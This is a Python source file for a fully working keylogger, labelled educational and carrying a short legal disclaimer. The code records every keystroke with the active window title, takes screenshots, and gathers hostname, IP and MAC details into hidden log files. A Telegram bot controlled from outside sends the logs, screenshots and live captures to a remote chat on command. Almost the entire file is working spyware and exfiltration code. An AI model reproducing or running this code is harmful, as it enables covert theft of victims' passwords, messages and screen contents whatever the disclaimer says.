"""
Educational keylogger demonstrating keyboard capture, active window tracking,
size-based log rotation, screenshot capturing, and remote Telegram bot management.

IMPORTANT: Unauthorized use of keyloggers is illegal. Only use on systems you own
or have explicit permission to monitor.
"""
import os
import platform
import re
import socket
import subprocess
import time
import uuid
from dataclasses import dataclass
from datetime import datetime
from enum import Enum, auto
from pathlib import Path
from threading import Event, Lock, Thread

import mss
import pyfiglet
from telegram.ext import Application, CommandHandler

try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
except ImportError as exc:
    raise ImportError("pynput is required: uv add pynput") from exc

try:
    import requests
except ImportError:
    requests = None

WINDOWS = "Windows"
DARWIN = "Darwin"
LINUX = "Linux"

if platform.system() == WINDOWS:
    try:
        import psutil
        import win32gui
        import win32process
    except ImportError:
        win32gui = None
elif platform.system() == DARWIN:
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None

ascii_banner = pyfiglet.figlet_format("Keylogger")
print(ascii_banner)

BOT_TOKEN = "your bot token"  #enter your bot token here
LOG_DIR = os.path.expanduser("~/.keylogger_logs")

BYTES_PER_MB = 1024 * 1024
WINDOW_CHECK_INTERVAL_SECS = 0.5
LISTENER_JOIN_TIMEOUT_SECS = 1.0

SPECIAL_KEYS: dict[Key, str] = {
    Key.space: "[SPACE]",
    Key.enter: "[ENTER]",
    Key.tab: "[TAB]",
    Key.backspace: "[BACKSPACE]",
    Key.delete: "[DELETE]",
    Key.shift: "[SHIFT]",
    Key.shift_r: "[SHIFT]",
    Key.ctrl: "[CTRL]",
    Key.ctrl_r: "[CTRL]",
    Key.alt: "[ALT]",
    Key.alt_r: "[ALT]",
    Key.cmd: "[CMD]",
    Key.cmd_r: "[CMD]",
    Key.esc: "[ESC]",
    Key.up: "[UP]",
    Key.down: "[DOWN]",
    Key.left: "[LEFT]",
    Key.right: "[RIGHT]",
}


def get_system_info() -> dict:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
        finally:
            s.close()

        info = {
            "platform": platform.system(),
            "platform-release": platform.release(),
            "platform-version": platform.version(),
            "architecture": platform.machine(),
            "hostname": socket.gethostname(),
            "ip-address": local_ip,
            "mac-address": ":".join(re.findall("..", "%012x" % uuid.getnode())),
            "processor": platform.processor(),
        }

        if requests:
            try:
                response = requests.get("https://api.ipify.org?format=json", timeout=3)
                info["global-ip-address"] = response.json().get("ip", "N/A")
            except Exception:
                info["global-ip-address"] = "Could not fetch global IP address"

        return info
    except Exception as e:
        print("Error capturing system info:", e)
        return {}


def capture_screenshots() -> None:
    os.makedirs(LOG_DIR, exist_ok=True)
    try:
        with mss.MSS() as sct:
            sct.shot(mon=1, output=os.path.join(LOG_DIR, "screenshot1.png"))
            time.sleep(3)
            sct.shot(mon=1, output=os.path.join(LOG_DIR, "screenshot2.png"))
    except Exception as e:
        print("Error capturing initial screenshots:", e)


# --- Telegram Bot Handlers ---

async def start_command(update, context):
    msg = (
        "🤖 *Keylogger & Monitor Bot*\n\n"
        "Available Commands:\n"
        "• `/sendlogs` - Send keylog text files\n"
        "• `/screenshots` - Send stored screenshots (.png)\n"
        "• `/take_screenshot` - Capture a live screenshot and send it\n"
        "• `/all` - Send all keylogs and screenshots\n"
        "• `/info` - Send system info\n"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")


async def sendlogs(update, context):
    if not os.path.exists(LOG_DIR):
        await update.message.reply_text("No log directory found.")
        return
    logs = [os.path.join(LOG_DIR, f) for f in os.listdir(LOG_DIR) if f.endswith(".txt")]
    if not logs:
        await update.message.reply_text("No keylog files (.txt) available.")
        return
    sent_count = 0
    for log in sorted(logs):
        if os.path.getsize(log) == 0:
            continue
        try:
            with open(log, "rb") as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    caption=f"📄 {os.path.basename(log)}",
                )
            sent_count += 1
        except Exception as e:
            await update.message.reply_text(f"Error sending {os.path.basename(log)}: {e}")

    if sent_count == 0:
        await update.message.reply_text("No non-empty log files found.")


async def screenshots(update, context):
    if not os.path.exists(LOG_DIR):
        await update.message.reply_text("No log directory found.")
        return
    imgs = [os.path.join(LOG_DIR, f) for f in os.listdir(LOG_DIR) if f.endswith((".png", ".jpg", ".jpeg"))]
    if not imgs:
        await update.message.reply_text("No screenshots available.")
        return
    sent_count = 0
    for img in sorted(imgs):
        if os.path.getsize(img) == 0:
            continue
        try:
            with open(img, "rb") as f:
                await context.bot.send_photo(
                    chat_id=update.effective_chat.id,
                    photo=f,
                    caption=f"📸 {os.path.basename(img)}",
                )
            sent_count += 1
        except Exception as e:
            await update.message.reply_text(f"Error sending {os.path.basename(img)}: {e}")

    if sent_count == 0:
        await update.message.reply_text("No valid screenshot files found.")


async def take_screenshot_command(update, context):
    await update.message.reply_text("📸 Capturing screenshot...")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs(LOG_DIR, exist_ok=True)
    file_path = os.path.join(LOG_DIR, f"live_{ts}.png")
    try:
        with mss.MSS() as sct:
            sct.shot(mon=1, output=file_path)
        with open(file_path, "rb") as f:
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=f,
                caption=f"📸 Live Screenshot ({ts})",
            )
    except Exception as e:
        await update.message.reply_text(f"Failed to capture screenshot: {e}")


async def send_all(update, context):
    await sendlogs(update, context)
    await screenshots(update, context)


async def info_command(update, context):
    info = get_system_info()
    text = "💻 *System Information*\n\n" + "\n".join(f"• *{k}*: `{v}`" for k, v in info.items())
    await update.message.reply_text(text, parse_mode="Markdown")


def run_bot():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler(["start", "help"], start_command))
    app.add_handler(CommandHandler("sendlogs", sendlogs))
    app.add_handler(CommandHandler("screenshots", screenshots))
    app.add_handler(CommandHandler("take_screenshot", take_screenshot_command))
    app.add_handler(CommandHandler("all", send_all))
    app.add_handler(CommandHandler("info", info_command))
    app.run_polling()


# --- Core Keylogger Implementation ---

class KeyType(Enum):
    CHAR = auto()
    SPECIAL = auto()
    UNKNOWN = auto()


@dataclass
class KeyloggerConfig:
    log_dir: Path = Path.home() / ".keylogger_logs"
    log_file_prefix: str = "keylog"
    max_log_size_mb: float = 5.0
    toggle_key: Key = Key.f9
    enable_window_tracking: bool = True
    log_special_keys: bool = True
    window_check_interval: float = WINDOW_CHECK_INTERVAL_SECS


@dataclass
class KeyEvent:
    timestamp: datetime
    key: str
    window_title: str | None = None
    key_type: KeyType = KeyType.CHAR

    def to_log_string(self) -> str:
        time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        window = f" [{self.window_title}]" if self.window_title else ""
        return f"[{time_str}]{window} {self.key}"


class WindowTracker:
    @staticmethod
    def get_active_window() -> str | None:
        system = platform.system()
        if system == WINDOWS and win32gui:
            return WindowTracker._get_windows_window()
        if system == DARWIN and NSWorkspace:
            return WindowTracker._get_macos_window()
        if system == LINUX:
            return WindowTracker._get_linux_window()
        return None

    @staticmethod
    def _get_windows_window() -> str | None:
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            title = win32gui.GetWindowText(hwnd)
            return f"{process.name()} - {title}" if title else process.name()
        except Exception:
            return None

    @staticmethod
    def _get_macos_window() -> str | None:
        try:
            active = NSWorkspace.sharedWorkspace().activeApplication()
            return active.get("NSApplicationName", "Unknown")
        except Exception:
            return None

    @staticmethod
    def _get_linux_window() -> str | None:
        try:
            result = subprocess.run(
                ["xdotool", "getactivewindow", "getwindowname"],
                capture_output=True,
                text=True,
                timeout=1,
                check=False,
            )
            return result.stdout.strip() if result.returncode == 0 else None
        except Exception:
            return None


class LogManager:
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        config.log_dir.mkdir(parents=True, exist_ok=True)
        self.current_log_path = self._get_new_log_path()
        self._lock = Lock()
        self._file = open(self.current_log_path, "a", encoding="utf-8")

    def write_system_info(self, info: dict) -> None:
        with self._lock:
            self._file.write("\n=== System Information ===\n")
            for key, value in info.items():
                self._file.write(f"{key}: {value}\n")
            self._file.write("==========================\n\n")
            self._file.flush()

    def _get_new_log_path(self) -> Path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        name = f"{self.config.log_file_prefix}_{ts}.txt"
        return self.config.log_dir / name

    def write_event(self, event: KeyEvent) -> None:
        with self._lock:
            self._file.write(event.to_log_string() + "\n")
            self._file.flush()
            self._check_rotation()

    def _check_rotation(self) -> None:
        try:
            size = self.current_log_path.stat().st_size
        except FileNotFoundError:
            self._rotate()
            return

        if size / BYTES_PER_MB >= self.config.max_log_size_mb:
            self._rotate()

    def _rotate(self) -> None:
        self._file.close()
        self.current_log_path = self._get_new_log_path()
        self._file = open(self.current_log_path, "a", encoding="utf-8")

    def close(self) -> None:
        with self._lock:
            self._file.close()


class Keylogger:
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.log_manager = LogManager(config)
        self.window_tracker = WindowTracker()
        self.is_running = Event()
        self.is_logging = Event()
        self.listener: keyboard.Listener | None = None
        self._current_window: str | None = None
        self._last_window_check = datetime.now()

    def _update_active_window(self) -> None:
        if not self.config.enable_window_tracking:
            return

        now = datetime.now()
        if (now - self._last_window_check).total_seconds() >= self.config.window_check_interval:
            self._current_window = self.window_tracker.get_active_window()
            self._last_window_check = now

    def _process_key(self, key: Key | KeyCode) -> tuple[str, KeyType]:
        if isinstance(key, Key):
            label = SPECIAL_KEYS.get(key)
            if label:
                return label, KeyType.SPECIAL
            return f"[{key.name.upper()}]", KeyType.SPECIAL

        if hasattr(key, "char") and key.char:
            return key.char, KeyType.CHAR

        return "[UNKNOWN]", KeyType.UNKNOWN

    def _on_press(self, key: Key | KeyCode) -> None:
        if key == self.config.toggle_key:
            self._toggle_logging()
            return

        if not self.is_logging.is_set():
            return

        self._update_active_window()
        key_str, key_type = self._process_key(key)

        if key_type == KeyType.SPECIAL and not self.config.log_special_keys:
            return

        event = KeyEvent(
            timestamp=datetime.now(),
            key=key_str,
            window_title=self._current_window,
            key_type=key_type,
        )

        self.log_manager.write_event(event)

    def _toggle_logging(self) -> None:
        toggle = self.config.toggle_key.name.upper()
        if self.is_logging.is_set():
            self.is_logging.clear()
            print(f"\n[*] Logging paused. Press {toggle} to resume.")
        else:
            self.is_logging.set()
            print(f"\n[*] Logging resumed. Press {toggle} to pause.")

    def start(self) -> None:
        toggle = (
            self.config.toggle_key.name.upper()
            if hasattr(self.config.toggle_key, "name")
            else str(self.config.toggle_key)
        )
        print("Keylogger Started\n")
        print(f"Log Directory: {self.config.log_dir}")
        print(f"Current Log: {self.log_manager.current_log_path.name}")
        print(f"Toggle Key: {toggle}")
        print(f"[*] Press {toggle} to start/stop logging")
        print("[*] Press CTRL+C to exit\n")

        self.is_running.set()
        self.is_logging.set()

        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

        try:
            while self.is_running.is_set():
                self.listener.join(timeout=LISTENER_JOIN_TIMEOUT_SECS)
        except KeyboardInterrupt:
            self.stop()

    def stop(self) -> None:
        print("\n\n[*] Shutting down...")
        self.is_running.clear()
        self.is_logging.clear()
        if self.listener:
            self.listener.stop()
            self.listener = None
        self.log_manager.close()
        print("[*] Keylogger stopped.")


if __name__ == "__main__":
    capture_screenshots()

    keylogger = Keylogger(KeyloggerConfig())
    system_info = get_system_info()
    keylogger.log_manager.write_system_info(system_info)

    # Run keylogger in background thread
    Thread(target=keylogger.start, daemon=True).start()

    # Run Telegram bot in main thread
    run_bot()
